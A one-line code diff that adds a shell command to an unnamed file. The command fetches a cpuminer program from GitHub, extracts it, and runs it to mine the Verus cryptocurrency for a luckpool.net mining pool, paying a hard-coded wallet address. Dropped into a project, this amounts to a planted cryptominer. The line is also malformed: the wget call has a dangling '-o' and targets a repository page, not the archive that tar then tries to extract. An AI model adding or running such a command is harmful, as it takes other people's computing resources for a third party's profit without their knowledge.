@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer -o && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RNxeebTqsFvE424qvzYNFQ4Xcd29Qbn5Ev -p hybrid-t
